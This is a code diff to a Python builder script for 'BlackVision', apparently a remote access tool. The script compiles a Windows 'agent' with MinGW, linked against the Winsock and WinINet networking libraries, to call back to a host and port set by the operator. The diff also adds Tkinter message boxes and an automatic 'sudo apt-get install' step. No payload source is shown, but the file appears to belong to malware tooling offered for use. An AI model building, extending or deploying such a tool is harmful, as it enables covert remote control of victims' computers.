@@ -1,6 +1,8 @@
 import os
 import colorama
 from shutil import which
+from tkinter import *
+from tkinter import messagebox
 
 colorama.init()
 def banner():
@@ -18,9 +20,9 @@ def clear():
     else:
         os.system("clear")
 
-def generate():
+def generate(host, port, filename):
 
-    def mingw_check(path):
+    def mingw(path):
         print("[~] Checking if mingw compiler is installed.")
         p = which(path)
         if(p):
@@ -31,27 +33,40 @@ def generate():
             return False
 
     if(os.name == "nt"):
-        if(mingw_check("g++") == True):
+        if(mingw("g++") == True):
             print("[+] Generating Executable..")
-            host = input("[?] Enter Host : ")
-            port = input("[?] Enter Port : ")
-            filename = input("[?] Filename : ")
             # First Change Host and Port then continue
-            wincmd = "g++ main.cpp blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static"
+            wincmd = "g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static"
             os.system(wincmd)
         else :
             print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
     else:
-        if(mingw_check("i686-w64-mingw32-g++") == True):
+        if(mingw("i686-w64-mingw32-g++") == True):
             print("[+] Generating Executable..")
             host = input("[?] Enter Host : ")
             port = input("[?] Enter Port : ")
             filename = input("[?] Filename : ")
             # Change Host port then continue
-            cmd = "i686-w64-mingw32-g++ main.cpp blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static"
+            cmd = "i686-w64-mingw32-g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static"
             os.system(cmd)
 
         else:
             print("[+] Attempting to Install mingw..")
             os.system("sudo apt-get install mingw-w64")
+
+
+
+def showError(errormessage):
+    """ Show an Error MessageBox """
+    messagebox.showerror("BlackVision", errormessage)
+
+def showInfo(infomessage):
+    """ Show an Information MessageBox """
+    messagebox.showinfo("BlackVision", infomessage)
+
+def showWarning(warning):
+    """ Show an Information MessageBox """
+    messagebox.showwarning("BlackVision", warning)
+
+
 
